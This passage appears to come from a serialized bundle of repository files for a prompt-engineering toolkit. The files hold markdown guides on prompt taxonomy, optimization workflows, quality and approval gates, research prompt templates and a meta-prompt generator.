prompt-library/assets/templates/\n- Apply **Signal-to-Noise Rule** for format decision\n- Use XML tags (Max 15) ONLY for semantic envelopes\n- Never nest XML tags\n- Include concrete examples\n\n## 5. Write Output to File\n\n**Output locations:**\n- Single prompts: `.cattoolkit/prompts/{number}-{name}.md`\n- Prompt chains: `.cattoolkit/chains/{number}-{topic}/`\n- Meta-prompts: `.cattoolkit/generators/{purpose}.md`\n- Optimized prompts: Same location as original with `.v2` suffix or overwrite\n\n**Validation:**\n- Verify structure follows template\n- Ensure XML tag limits respected\n- Confirm examples are concrete and helpful\n- Check for clarity and effectiveness\n\n## 6. Log Completion\n\n**Log success:**\n```\n[PROMPT-ENGINEER] Prompt engineering complete\n- Type: [single | meta-prompt | optimization]\n- Output: [file path]\n- Key feature: [one-line summary]\n```\n\n**Report to orchestrator:**\nReturn a summary message with:\n- Prompt type created/optimized\n- Key features or improvements\n- Location of output file(s)\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/metadata.md": "# Metadata & Documentation Guidelines\n\nStandardized metadata for prompt artifacts to ensure searchability and context preservation.\n\n## YAML Frontmatter (Optional)\nFor standardized prompts, use a minimal YAML frontmatter for metadata:\n\n```yaml\n---\ntype: [single|chain|meta]\nversion: 1.0.0\nobjective: \"Brief description of goal\"\ntags: [tag1, tag2]\n---\n```\n\n## Prompt Chain: SUMMARY.md\nEvery chain MUST have a `SUMMARY.md` in its root folder.\n\n### Required Sections:\n- **Title**: `# Chain: {Topic Name}`\n- **Objective**: Detailed goal of the entire workflow.\n- **Workflow Map**:\n    - Step 1: Research (complete/pending)\n    - Step 2: Planning (complete/pending)\n    - etc.\n- **Final Output**: Description of the combined deliverable.\n- **Success Criteria**: How to know the chain succeeded.\n\n## Directory Numbering\nFollow the 01-based numbering for chains and (optionally) for single prompts:\n- `.cattoolkit/chains/01-competitive-analysis/`\n- `.cattoolkit/prompts/01-code-review.md`\n\n## Output Staging\nAll intermediate results in a chain must be saved to the `outputs/` subfolder using meaningful names:\n- `outputs/01-research-findings.md`\n- `outputs/02-implementation-plan.md`\n\n## Reference Naming\nWhen referencing other files in a chain, use the relative path or @ symbol if the tool supports it:\n`@outputs/01-research-findings.md`\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/optimization-workflow.md": "# Optimize Existing Prompt\n\nRefine and enhance prompts for better performance using systematic optimization techniques.\n\n## Workflow\n\n### 1. Analyze Current Prompt\nRead and evaluate the existing prompt:\n- **Strengths**: What's working well?\n- **Weaknesses**: Where does it break down or underperform?\n- **Ambiguity**: Are instructions clear and unambiguous?\n- **Completeness**: Are all necessary details included?\n- **Structure**: Is the format optimal for the task?\n\n### 2. Identify Improvement Opportunities\nBased on prompt-engineering skill, locate specific issues:\n- **Clarity**: Vague or confusing instructions?\n- **Specificity**: Need more concrete guidance?\n- **Examples**: Would examples improve understanding?\n- **Structure**: Should format be Markdown or XML/Markdown hybrid?\n- **Constraints**: Missing critical rules or safety measures?\n- **Context**: Insufficient background information?\n\n### 3. Apply Optimization Techniques\nUse proven methods from prompt-engineering skill:\n- **Progressive Disclosure**: Add headers for organization\n- **Chain-of-Thought**: Add reasoning steps for complex tasks\n- **Few-Shot Learning**: Insert concrete examples\n- **Role Definition**: Clarify the AI's persona/expertise\n- **Constraint Isolation**: Highlight critical rules\n- **Signal-to-Noise**: Optimize format selection\n\n### 4. Implement Improvements\nRefactor the prompt systematically:\n- Fix ambiguous language\n- Add missing context or examples\n- Restructure for better flow\n- Apply appropriate pattern from prompt-library\n- Remove unnecessary complexity\n- Strengthen constraints where needed\n\n### 5. Output Optimized Version\nSave improvements to:\n- **OPTIMIZED_PROMPT.md** in the current directory\n- Include comparison notes in comments\n- Maintain original intent while enhancing execution\n- Apply template structure from prompt-library skill\n\n## Key Resources\n- **Optimization Theory**: `references/optimization.md`\n- **Anti-Patterns**: `references/anti-patterns.md`\n- **Templates**: `assets/templates/`\n\n## Output\nOptimized prompt saved to `OPTIMIZED_PROMPT.md` with:\n- Clearer instructions\n- Better structure\n- Added examples if needed\n- Enhanced effectiveness\n- Performance improvements documented\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/optimization.md": "# Systematic Prompt Optimization\n\nThe iterative process for refining prompts to meet production-level quality standards.\n\n## The Optimization Workflow\n\n```mermaid\ngraph TD\n    A[Baseline Testing] --> B[Failure Analysis]\n    B --> C[Optimization]\n    C --> D[A/B Validation]\n    D -->|Fails| C\n    D -->|Passes| E[Documentation]\n```\n\n### 1. Baseline Testing\nEstablish how your prompt currently performs using a diverse test set.\n- **Test Set**: Simple cases, edge cases, complex cases, ambiguous inputs.\n- **Metrics**: Accuracy, format compliance, completeness, consistency.\n\n### 2. Failure Analysis\nCategorize why the prompt failed:\n- **Format Errors**: Wrong structure.\n- **Incomplete**: Missing info.\n- **Hallucination**: Incorrect info.\n- **Verbosity**: Too much noise.\n\n### 3. Optimization Strategies\n\n| Failure Mode | Recommended Fix |\n|:---|:---|\n| **Formatting Issues** | Add `<output_format>` and 2-3 examples. |\n| **Incompleteness** | Add a `Requirement Checklist` in markdown. |\n| **Wrong Info** | Add `<thinking>` for CoT and a `Verification` step. |\n| **Off-Topic** | Define clear `<constraints>` (Negative constraints). |\n| **Inconsistency** | Increase example count (Few-shot) and diversity. |\n\n### 4. A/B Validation\nTest the optimized version against the baseline using the *same* inputs.\n- Only keep changes that demonstrably improve metrics.\n- Be careful of \"over-fitting\" to one specific test case.\n\n## Advanced Techniques\n\n### Quality Gates\nAdd a checklist *inside the prompt* that the AI must verify before outputting.\n```markdown\n## Quality Gate\nBefore responding, ensure:\n1. All security vulnerabilities are identified.\n2. Remediation steps are provided for each.\n3. Severity levels follow the [defined scale].\n```\n\n### Constraint Weighting\nUse strong language (MUST, NEVER, ALWAYS) for critical constraints and more flexible language for style preferences.\n\n## Version Control\nAlways version your prompts and maintain a changelog of what was optimized.\n- **v1.0**: Baseline.\n- **v1.1**: Added few-shot examples (Fixed format).\n- **v1.2**: Added quality gates (Fixed completeness).\n\n## Diminishing Returns\nStop optimizing when:\n- Success rate meets the target (usually >90%).\n- Diminishing returns make further effort inefficient.\n- The prompt becomes so verbose it hits token limits or loses focus.\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/quality.md": "# Prompt Quality & Audit Criteria\n\nThe standards used to evaluate prompt artifacts for production readiness.\n\n## Core Quality Pillars\n\n### 1. Structure Compliance\n- **Single Prompts**: Must be Pure Markdown (0 XML tags).\n- **Chains/Meta-Prompts**: Hybrid XML (1-15 tags maximum).\n- **Flat Tags**: No nested XML tags allowed.\n- **Hierarchy**: Uses clear Markdown headings and lists.\n\n### 2. Instructability\n- **Actionable**: Steps are concrete and unambiguous.\n- **Specific**: No vague commands like \"be helpful\" or \"analyze\".\n- **Complete**: All necessary context for the task is included or requested.\n- **Sequential**: Logical flow for multi-step instructions.\n\n### 3. Output Control\n- **Format**: Output format (JSON, Markdown, etc.) is explicitly defined.\n- **Structure**: Clear schemas or templates for complex outputs.\n- **Constraints**: Critical negative constraints (NEVER/MUST NOT) are highlighted.\n\n### 4. Safety & Security\n- **Isolation**: Few-shot examples are wrapped in `<example>` tags.\n- **Data Protection**: No hardcoded credentials or sensitive data instructions.\n- **Boundaries**: Clear scope on what the AI should and should NOT do.\n\n## Audit Scoring Matrix\n\n| Quality | Description | Ready? |\n|:---|:---|:---:|\n| **Production** | Meets all criteria, tested on edge cases, concise. |  |\n| **Needs Work** | Good content but minor structural or clarity issues. |  |\n| **Failing** | Nested XML, vague tasks, or missing output format. |  |\n\n## The \"AI Soup\" Anti-Checklist\n- [ ] Is there any nested XML? (If yes, fix to flat).\n- [ ] Is there a tag soup (>5 tags)? (If yes, consolidate).\n- [ ] Is there instruction leakage? (Check if examples are isolated).\n- [ ] Is it too verbose? (Prune low-value tokens).\n- [ ] Is the role duplicated from a parent agent? (Keep it lean).\n\n## Verification Strategy\n1. **Manual Review**: Check against the pillars above.\n2. **Execution Test**: Run with `run-prompt` on 3-5 diverse inputs.\n3. **Audit Prompt**: Use the Prompt Auditor meta-prompt for an AI-driven critique.\n\n---\n\n## Approval Gate Workflows\n\nFor complex prompts and workflows, implement structured approval gates to ensure quality and user alignment.\n\n### Gate 1: Requirements Validation (Pre-Design)\n\n**When to Apply:** Complex prompts with multiple phases or architectural decisions\n\n**Approval Required From:** User or Stakeholder\n\n**Checklist:**\n- [ ] User has explicitly stated the goal/objective\n- [ ] Success criteria are defined and measurable\n- [ ] Edge cases and constraints are documented\n- [ ] Risk level has been assessed (Low/Medium/High/Critical)\n- [ ] Scope boundaries are clear (what's in/out)\n\n**Output:** Requirements document with explicit user sign-off\n\n---\n\n### Gate 2: Architecture Selection (Pre-Implementation)\n\n**When to Apply:** Prompts requiring design decisions or multiple approaches\n\n**Approval Required From:** User\n\n**Checklist:**\n- [ ] Multiple approaches have been presented\n- [ ] Trade-offs are clearly explained\n- [ ] User has selected preferred approach\n- [ ] Implementation plan is aligned with selected architecture\n- [ ] All questions from requirements phase are answered\n\n**Output:** Architecture decision document with user signature\n\n**Presentation Format:**\n```markdown\n### Architecture Options\n\n| Approach | Pros | Cons | Estimated Complexity |\n|----------|------|------|---------------------|\n| A: Minimal | Fast to implement | Limited flexibility | Low |\n| B: Clean | Maintainable, scalable | More complex | Medium-High |\n| C: Pragmatic | Balanced trade-offs | Compromise on purity | Medium |\n\n**Recommendation:** [Approach] because [reasoning]\n\nWhich approach do you prefer?\n```\n\n---\n\n### Gate 3: Quality Review (Pre-Deployment)\n\n**When to Apply:** Production-ready prompts and workflows\n\n**Approval Required From:** User (with automated checks)\n\n**Automated Checks:**\n- [ ] All quality pillars are satisfied\n- [ ] No nested XML tags present\n- [ ] XML tag count  15\n- [ ] Examples are properly isolated\n- [ ] Output format is clearly specified\n\n**Human Review:**\n- [ ] **Critical Issues:** Must be fixed before deployment\n- [ ] **Recommended Issues:** Should be addressed for optimal quality\n- [ ] **Optional Issues:** Nice-to-have improvements\n\n**Output:**\n```markdown\n### Review Findings\n\n**Critical (must fix):**\n- [Issue]: [Location]  [Reason]\n\n**Recommended (should fix):**\n- [Issue]: [Location]  [Reason]\n\n**Optional (nice to have):**\n- [Issue]: [Location]  [Reason]\n\nHow would you like to proceed?\n- A) Fix all issues\n- B) Fix critical + recommended only\n- C) Fix critical only\n- D) Deploy as-is\n```\n\n---\n\n### Gate 4: Final Sign-Off (Pre-Production)\n\n**When to Apply:** Critical production systems\n\n**Approval Required From:** User and Technical Reviewer\n\n**Checklist:**\n- [ ] All critical issues are resolved\n- [ ] Testing has been completed\n- [ ] Documentation is up-to-date\n- [ ] Rollback plan is defined (if applicable)\n- [ ] User explicitly approves production deployment\n\n**Output:** Deployment approval document\n\n---\n\n## Approval Gate Templates\n\n### Template 1: Requirements Validation\n```markdown\n## Requirements Review\n\n**Objective:** {Clear statement of prompt goal}\n\n**Success Criteria:**\n1. {Measurable criterion 1}\n2. {Measurable criterion 2}\n3. {Measurable criterion 3}\n\n**Constraints:**\n- {Constraint 1}\n- {Constraint 2}\n\n**Risk Assessment:** {Low/Medium/High/Critical}\n\n**Approved by:** _________________ **Date:** _________\n```\n\n### Template 2: Architecture Selection\n```markdown\n## Architecture Decision\n\n**Selected Approach:** {A/B/C}\n\n**Rationale:**\n{User's reasoning for selection}\n\n**Implementation Plan:**\n{Brief description of how the selected approach will be implemented}\n\n**Approved by:** _________________ **Date:** _________\n```\n\n### Template 3: Quality Review\n```markdown\n## Quality Review Report\n\n**Prompt:** {Name}\n\n**Automated Checks:**  All passed\n\n**Critical Issues:** {Count}\n**Recommended Issues:** {Count}\n**Optional Issues:** {Count}\n\n**Decision:** {A/B/C/D from review options}\n\n**Approved by:** _________________ **Date:** _________\n```\n\n---\n\n## Escalation Path\n\n| Severity | Action Required | Who |\n|:---------|:----------------|:----|\n| **Critical** | Immediate fix before proceeding | User + Technical Review |\n| **Recommended** | Address within current session | User |\n| **Optional** | Future enhancement | Deferred |\n| **Structural** | Architecture redesign | User + Technical Review |\n\n---\n\n## Quality Gate Decision Matrix\n\n| Prompt Type | Gate 1 | Gate 2 | Gate 3 | Gate 4 |\n|:------------|:------:|:------:|:------:|:------:|\n| **Single Prompt** | Optional | Never | Always | Never |\n| **Chain Prompt** | Required | Sometimes | Always | High-Risk Only |\n| **Complex Command** | Always | Always | Always | High-Risk Only |\n| **Meta-Prompt** | Always | Sometimes | Always | Always |\n\n**Legend:**\n- **Always:** Mandatory approval gate\n- **Sometimes:** Apply based on complexity/requirements\n- **Never:** Not applicable\n- **High-Risk Only:** Apply when risk level is Critical\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/research-prompts.md": "# Research Prompt Library\n\n## Operational Protocol\n\nThese prompts transform AI from a \"cool toy\" into a research weapon capable of performing 10 hours of work in 60 seconds. They operationalize critical thinking frameworks into copy-paste templates.\n\n**Usage Pattern:**\n1. Identify the cognitive mode you need (Critique, Synthesis, Inversion, Meta)\n2. Select the appropriate prompt template\n3. Replace `{{content}}` with your material\n4. Apply directly or adapt variables as needed\n\n**Framework Synergies:**\nThese prompts map to thinking-frameworks methodologies:\n- **First-Principles**: Contradictions Finder, Explain Backwards, Assumption Stress Test, Translate Across Domains\n- **Inversion**: Reviewer #2, What Would Break This?, Assumption Stress Test\n- **Second-Order Thinking**: Turn Into Paper, What Changed My Mind?\n- **Occam's Razor**: One-Page Mental Model\n- **Via Negativa**: Reviewer #2, Steal the Structure\n\n---\n\n## Critique Mode (Adversarial Analysis)\n\n### 1. Contradictions Finder\n**Framework:** First-Principles + Inversion\n**Use When:** Auditing logical consistency of arguments, papers, reports, or long documents\n\n**Template:**\n```\nAnalyze {{content}}.\n\nList all internal contradictions, unresolved tensions, or claims that don't fully follow from the evidence.\n\nFor each finding:\n1. Quote the contradicting statements\n2. Explain the tension\n3. Rate severity: Minor | Moderate | Critical\n```\n\n**Example Application:**\n> Input: Academic paper on climate policy\n> Output: Identifies contradiction between stated goals and proposed timeline, flags unsupported causal claims\n\n**Pro Tip:** Pair with \"Assumption Stress Test\" for comprehensive logical audit.\n\n---\n\n### 2. Reviewer #2 (Skeptical Peer Review)\n**Framework:** Inversion + Via Negativa\n**Use When:** Need harsh, honest critique before publication/presentation\n\n**Template:**\n```\nCritique {{content}} like a skeptical peer reviewer. Be harsh.\n\nFocus on:\n- Methodology flaws\n- Missing controls\n- Overconfident claims\n- Unsupported conclusions\n\nDo NOT soften feedback. Identify the 3 most damaging weaknesses.\n```\n\n**Example Application:**\n> Input: Business proposal claiming 300% ROI\n> Output: Exposes lack of market validation, missing competitive analysis, unrealistic assumptions\n\n**Pro Tip:** Use after initial draft to identify blind spots before sharing.\n\n---\n\n### 3. Assumption Stress Test\n**Framework:** First-Principles + Inversion\n**Use When:** Testing the foundation of an argument before building on it\n\n**Template:**\n```\nList every assumption {{content}} relies on.\n\nNow tell me which ones are most fragile and why.\n\nRate each assumption:\n- Foundation: Core truth that cannot be questioned\n- Plausible: Reasonable but unproven\n- Fragile: Weak, untested, or likely false\n```\n\n**Example Application:**\n> Input: Startup pitch about AI disruption\n> Output: Identifies assumptions about market readiness, technology maturity, regulatory environment\n\n**Pro Tip:** This is the \"5-Whys\" of argument analysisdig until you hit system-level assumptions.\n\n---\n\n## Synthesis Mode (Knowledge Compression)\n\n### 4. Turn Into Paper (Structured Research Brief)\n**Framework:** Second-Order + SWOT\n**Use When:** Converting raw notes, links, or half-baked ideas into structured research\n\n**Template:**\n```\nTurn the following material into a structured research brief:\n\n{{content}}\n\nInclude:\n- Key claims\n- Evidence supporting each claim\n- Assumptions underlying the research\n- Counterarguments\n- Open questions\n- Anything weak or missing\n\nFlag any claims that lack sufficient evidence.\n```\n\n**Example Application:**\n> Input: Collection of news articles about industry trends\n> Output: Structured brief with 3 main claims, supporting data, identified gaps\n\n**Pro Tip:** This replaces hours of manual cleanup and structuring.\n\n---\n\n### 5. One-Page Mental Model\n**Framework:** Occam's Razor + Pareto\n**Use When:** Compressing complex topics into memorable, actionable models\n\n**Template:**\n```\nCompress {{content}} into a single mental model I can remember.\n\nRequirements:\n- Fits on one page\n- Contains core insight (not just facts)\n- Uses analogy or metaphor for memorability\n- Provides decision-making framework\n\nIf it can't compress, I don't own it yet.\n```\n\n**Example Application:**\n> Input: Complex technical architecture\n> Output: \"Layered onion\" model showing dependency hierarchy and change propagation\n\n**Pro Tip:** Use this to create personal knowledge frameworks, not just summaries.\n\n---\n\n### 6. Translate Across Domains\n**Framework:** First-Principles\n**Use When:** Understanding concepts through analogies from different fields\n\n**Template:**\n```\nExplain {{content}} using analogies from a completely different field.\n\nRequirements:\n- Use field: [specify field, e.g., biology, engineering, sports]\n- Explain core mechanism\n- Highlight transferable principles\n- Identify what breaks in the analogy\n\nThis unlocks insight, not just understanding.\n```\n\n**Example Application:**\n> Input: Blockchain technology\n> Output: Explained as \"distributed ledger like a village record-keeping system with multiple trusted scribes\"\n\n**Pro Tip:** Compare multiple analogies to find the most robust explanation.\n\n---\n\n## Inversion Mode (Backward Reasoning)\n\n### 7. Explain It Backwards\n**Framework:** First-Principles + 5-Whys\n**Use When:** Validating understanding by reconstructing from conclusion\n\n**Template:**\n```\nExplain {{content}} backwards:\n\n1. Start with the conclusion/finding\n2. Work backward step by step to the assumptions\n3. For each step, identify:\n   - What must be true for this to follow?\n   - What evidence supports this link?\n   - Where could the chain break?\n\nIf the logic collapses, I'll see it immediately.\n```\n\n**Example Application:**\n> Input: Complex financial model prediction\n> Output: Step-by-step deconstruction revealing hidden assumptions about market behavior\n\n**Pro Tip:** This exposes circular reasoning and logical gaps.\n\n---\n\n### 8. What Would Break This?\n**Framework:** Inversion\n**Use When:** Forecasting realistic failure modes and system robustness\n\n**Template:**\n```\nDescribe scenarios where {{content}} fails catastrophically.\n\nRequirements:\n- Not edge casesrealistic failure modes\n- Multiple failure cascades\n- Identify triggering conditions\n- Assess probability and impact\n\nMost people never ask this question.\n```\n\n**Example Application:**\n> Input: SaaS growth strategy\n> Output: Identifies market saturation, competitive response, customer acquisition cost explosion\n\n**Pro Tip:** Combine with \"Assumption Stress Test\" for complete risk analysis.\n\n---\n\n### 9. What Changed My Mind?\n**Framework:** Second-Order + Opportunity-Cost\n**Use When:** Triggering belief updates and evidence-based reasoning\n\n**Template:**\n```\nAfter analyzing {{content}}, what should change my current belief?\n\nRequirements:\n- Specific evidence that would flip my position\n- Quantified thresholds (e.g., \"If X happens 70% of the time...\")\n- Time-based triggers (e.g., \"If no progress in 6 months...\")\n- Early warning indicators\n\nThis is how real researchers think.\n```\n\n**Example Application:**\n> Input: Investment thesis\n> Output: Clear criteria for exit strategy and position reevaluation\n\n**Pro Tip:** Build in automatic reevaluation triggers, not just passive monitoring.\n\n---\n\n## Meta Mode (Structural Analysis)\n\n### 10. Compare Like a Scientist\n**Framework:** Opportunity-Cost + SWOT\n**Use When:** Rigorous comparison of approaches, not just feature lists\n\n**Template:**\n```\nCompare {{approach_a}} vs {{approach_b}} across:\n- Theoretical grounding\n- Failure modes\n- Scalability constraints\n- Real-world applicability\n- Hidden costs/trade-offs\n\nThis is comparison, not feature listing.\n```\n\n**Example Application:**\n> Input: Monolith vs microservices architecture\n> Output: Systematic comparison of operational complexity, team structure, scaling patterns\n\n**Pro Tip:** Focus on trade-offs, not advantages. Every solution has costs.\n\n---\n\n### 11. Steal the Structure\n**Framework:** Via Negativa + Meta-cognition\n**Use When:** Analyzing successful arguments, papers, or presentations to extract reusable patterns\n\n**Template:**\n```\nIgnore the content of {{content}}. Analyze the structure:\n\n- Argument flow pattern\n- Evidence sequencing\n- Rhetorical techniques\n- Cognitive biases leveraged\n- Why this structure works so well\n\nExtract the reusable template.\n```\n\n**Example Application:**\n> Input: Compelling TED Talk\n> Output: Pattern: Hook  Problem  Journey  Solution  Vision (with specific techniques at each step)\n\n**Pro Tip:** Apply this to great writing across domains to build a personal pattern library.\n\n---\n\n## Prompt Combinations (Advanced)\n\n### Critical Analysis Combo\n1. **Contradictions Finder**  Surface inconsistencies\n2. **Assumption Stress Test**  Identify fragile foundations\n3. **Reviewer #2**  Apply harsh peer review\n4. **What Would Break This?**  Stress test robustness\n\n### Synthesis Combo\n1. **Turn Into Paper**  Structure raw material\n2. **One-Page Mental Model**  Compress to essence\n3. **Translate Across Domains**  Create memorable analogies\n\n### Validation Combo\n1. **Explain It Backwards**  Validate logic chain\n2. **What Changed My Mind?**  Define evidence thresholds\n3. **Compare Like a Scientist**  Benchmark against alternatives\n\n---\n\n## Source & Attribution\n\nThese prompts were collected by Chris Laub (@ChrisLaubAI) from viral posts across Reddit, X, and research communities. They represent the most effective prompt patterns for research and critical analysis.\n\n**Original Thread:** \"I collected every Claude prompt that went viral on Reddit, X, and research communities. These turned a 'cool AI toy' into a research weapon that does 10 hours of work in 60 seconds.\"\n\n**Framework Mapping:** Operationalized using thinking-frameworks methodologies from the Cat Toolkit system.\n",
        "plugins/sys-cognition/skills/architecting-prompts/references/taxonomy.md": "# Prompt Taxonomy\n\nA detailed guide to the three core categories of prompt artifacts.\n\n## 1. Single Prompts\n**Focus**: direct execution of a standalone task.\n**Storage**: `.cattoolkit/prompts/`\n**Pattern**: Pure Markdown (0 XML tags).\n\n### Common Types:\n| Type | Purpose | Example |\n|:---|:---|:---|\n| **Analysis** | Examine and interpret info | Code review, data analysis |\n| **Generation** | Create new content | Write code, documentation |\n| **Review** | Evaluate and check quality | Security audit, compliance check |\n| **Transformation** | Convert/restructure formats | JSON to CSV, translation |\n| **Q&A** | Answer specific questions | Technical support, troubleshooting |\n| **Creative** | Generate ideas/development | Brainstorming, feature design |\n\n---\n\n## 2. Prompt Chains\n**Focus**: multi-step sequential workflows.\n**Storage**: `.cattoolkit/chains/{number}-{topic}/`\n**Pattern**: Hybrid XML (3-5 tags).\n\n### The Standard Chain Pattern:\n1. **Research**: Gather information and analyze requirements.\n2. **Plan**: Design the solution and strategy.\n3. **Execute**: Perform the primary task.\n4. **Refine**: Polishing and final validation.\n\n### Chain Artifacts:\n- **SUMMARY.md**: Overview of the chain's purpose and state.\n- **step-{n}-{name}.md**: The individual prompts for each phase.\n- **outputs/**: Directory for storing intermediate and final results.\n\n---\n\n## 3. Meta-Prompts\n**Focus**: Prompts that act on other prompts.\n**Storage**: `.cattoolkit/generators/`\n**Pattern**: Hybrid XML (3-5 tags).\n\n### Common Meta-Prompts:\n- **Prompt Generator**: Creates a new prompt from a user description.\n- **Prompt Optimizer**: Refines an existing prompt for better performance.\n- **Prompt Auditor**: Evaluates a prompt against the `quality.md` criteria.\n\n---\n\n## Choosing the Right Category\n\n- **Is it a one-time standalone task?**  Single Prompt.\n- **Does it require research or planning before execution?**  Prompt Chain.\n- **Are you trying to automate prompt creation itself?**  Meta-Prompt.\n",
        "plugins/sys-cognition/skills/facilitating-reasoning/SKILL.md": "---\nname: facilitating-reasoning\ndescription: \"Clarifies goals and applies structured thinking frameworks (Pareto, Inversion, First-Principles) to complex problems. Use when exploring constraints, analyzing decisions, or applying structured reasoning to uncover hidden assumptions.\"\nallowed-tools: [Read, Skill(applying-reasoning), AskUserQuestion]\n---\n\n# Reasoning Facilitation Protocol\n\n\n\n## Process\n\n### Phase 1: Context Check\nRead `.cattoolkit/context/scratchpad.md` if exists to understand current session context.\n\n### Phase 2: Analyze Input\nParse user's problem statement to identify:\n- Ambiguities in requirements\n- Hidden assumptions\n- Missing constraints\n- Decision points\n\n### Phase 3: Select Frameworks\nChoose the most relevant frameworks from `applying-reasoning` skill:\n- **Pareto Principle**\n- **Inversion**\n- **First-Principles**\n- **Systems Thinking**\n\n### Phase 4: Targeted Questions\nAsk actionable questions based on selected frameworks to help users uncover:\n- Specific constraints not initially mentioned\n- Dependencies and relationships\n- Risk factors and edge cases\n- Success criteria and metrics\n\n## Success Criteria\n\n- User provides specific constraints they hadn't mentioned before\n- Problem narrowed down to actionable scope\n- Session context preserved in scratchpad\n- Clear path forward identified\n\n## References\n\n- `applying-reasoning` - Framework selection and application\n\n",
        "plugins/sys-cognition/skills/generating-prompts/SKILL.md": "---\nname: generating-prompts\ndescription: \"Creates optimized prompts for Claude-to-Claude pipelines with research, planning, and execution stages. Use when building prompts that produce structured outputs for other prompts to consume, or when running multi-stage workflows. Do not use for simple prompts, single-step tasks, or basic conversational AI.\"\nallowed-tools: [Read, Write, Edit, Glob, Grep, Bash]\n---\n\n# Create Meta-Prompts\n\n\n\n## Quick Start\n\n### Workflow\n\n1. **Intake** - Determine purpose (Do/Plan/Research/Refine)\n2. **Generate** - Create prompt using purpose-specific templates\n3. **Execute** - Run prompt with dependency-aware execution\n4. **Validate** - Verify output and create summary\n\n### Directory Structure\n\n```\n.prompts/\n 001-topic-research/\n    001-topic-research.md     # Prompt\n    topic-research.md         # Output\n    SUMMARY.md                # Human summary\n 002-topic-plan/\n    002-topic-plan.md\n    topic-plan.md\n    SUMMARY.md\n```\n\n## Usage\n\n### Create Research Prompt\n\n```\n/create-meta-prompt research authentication options for the app\n```\n\n**What it does:**\n- Determines this is a Research task\n- Scans for existing research files to reference\n- Creates prompt with research-specific structure\n- Saves to `.prompts/{number}-{topic}-research/`\n- Executes with validation\n\n### Create Planning Prompt\n\n```\n/create-meta-prompt plan the auth implementation approach\n```\n\n**What it does:**\n- Detects existing auth-research.md\n- Asks if it should reference the research\n- Creates plan prompt with research context\n- Runs after research completes\n\n### Create Execution Prompt\n\n```\n/create-meta-prompt implement JWT authentication\n```\n\n**What it does:**\n- References both research and plan\n- Creates implementation prompt\n- Includes verification steps\n\n## Prompt Types\n\n### Research Prompts\n\nFor gathering information with structured output.\n\n**Structure:**\n```xml\n<objective>\nResearch {topic} to inform {purpose}\n</objective>\n\n<context>\n{Background and requirements}\n</context>\n\n<output>\nSave to: .prompts/{num}-{topic}-research/{topic}-research.md\nInclude: findings, recommendations, metadata\nCreate: SUMMARY.md\n</output>\n```\n\n### Plan Prompts\n\nFor creating approaches and strategies.\n\n**Structure:**\n```xml\n<objective>\nCreate implementation plan for {topic}\n</objective>\n\n<context>\nResearch: @.prompts/{num}-{topic}-research/{topic}-research.md\n</context>\n\n<output>\nSave to: .prompts/{num}-{topic}-plan/{topic}-plan.md\nInclude: phases, tasks, dependencies\nCreate: SUMMARY.md\n</output>\n```\n\n### Do Prompts\n\nFor executing tasks and producing artifacts.\n\n**Structure:**\n```xml\n<objective>\n{What to build/create/fix}\n</objective>\n\n<context>\nPlan: @.prompts/{num}-{topic}-plan/{topic}-plan.md\n</context>\n\n<output>\nCreate/modify: specified files\nVerify: tests and checks\nCreate: SUMMARY.md\n</output>\n```\n\n## Execution Engine\n\n### Single Prompt\n\nStraightforward execution of one prompt:\n\n1. Create folder: `.prompts/{number}-{topic}-{purpose}/`\n2. Write prompt to: `{number}-{topic}-{purpose}.md`\n3. Execute with Task agent\n4. Validate output\n5. Archive prompt\n\n### Sequential Execution\n\nFor chained prompts:\n\n1. Build execution queue from dependencies\n2. Execute each prompt in order\n3. Validate after each completion\n4. Stop on failure\n5. Report results\n\n### Parallel Execution\n\nFor independent prompts:\n\n1. Spawn all Task agents in single message\n2. Wait for completion\n3. Validate all outputs\n4. Report consolidated results\n\n## Chain Detection\n\nAutomatically detects dependencies:\n\n- Scans for existing `*-research.md` and `*-plan.md`\n- Matches by topic keyword\n- Suggests relevant files to reference\n- Determines execution order\n\n## Validation\n\nAfter execution, verifies:\n\n- Output file created and not empty\n- Required XML metadata present\n- SUMMARY.md created with all sections\n- One-liner is substantive\n\n## Summary Format\n\nEvery execution creates `SUMMARY.md`:\n\n```markdown\n# {Topic} {Purpose} Summary\n\n**{Substantive one-liner describing outcome}**\n\n## Key Findings\n- {Finding 1}\n- {Finding 2}\n\n## Files Created\n- `path/file.ext` - Description\n\n## Decisions Needed\n{Specific items or \"None\"}\n\n## Next Step\n{Concrete forward action}\n```\n\n## References\n\n**Templates:**\n- [references/research-patterns.md](references/research-patterns.md) - Research prompt templates\n- [references/plan-patterns.md](references/plan-patterns.md) - Planning prompt templates\n- [references/do-patterns.md](references/do-patterns.md) - Execution prompt templates\n\n**Supporting:**\n- [references/metadata-guidelines.md](references/metadata-guidelines.md) - Metadata structure\n- [references/question-bank.md](references/question-bank.md) - Intake questions\n- [references/summary-template.md](references/summary-template.md) - Summary format\n\n## Success Criteria\n\n**Prompt Creation:**\n- Purpose identified correctly\n- Chain detection performed\n- Prompt structure matches purpose\n- Output location specified\n- SUMMARY.md requirement included\n\n**Execution:**\n- Dependencies correctly ordered\n- Output validated\n- SUMMARY.md created\n- Results presented clearly\n",
        "plugins/sys-cognition/skills/generating-prompts/references/do-patterns.md": "# Do Patterns\n\nPrompt patterns for execution tasks that produce artifacts.\n\n## Template\n\n```markdown\n# {Topic} Implementation\n\n## Objective\n{What to build/create/fix}\n\n## Context\nResearch: @.prompts/{num}-{topic}-research/{topic}-research.md\nPlan: @.prompts/{num}-{topic}-plan/{topic}-plan.md\n\n## Requirements\n{Functional requirements}\n{Quality requirements}\n{Constraints}\n\n## Implementation\n{Approaches to follow}\n{What to avoid}\n{Integration points}\n\n## Output\nCreate/modify files:\n- `./path/file.ext` - {Description}\n\n## Verification\nBefore declaring complete:\n- [ ] {Specific test}\n- [ ] {How to confirm}\n- [ ] {Edge cases}\n\n## Summary Requirements\nCreate .prompts/{num}-{topic}-{purpose}/SUMMARY.md:\n\n```markdown\n# {Topic} Implementation Summary\n\n**{Substantive one-liner}**\n\n## Files Created\n- `path/file1.ext` - {Description}\n- `path/file2.ext` - {Description}\n\n## Verification\n- Tests: {Status}\n- Type check: {Status}\n- Manual test: {Status}\n\n## Next Step\n{Run tests / proceed to next phase}\n```\n```\n\n## Examples\n\n### Simple Implementation\nSingle artifact:\n\n```markdown\n# Email Validator Implementation\n\n## Objective\nCreate utility function to validate email 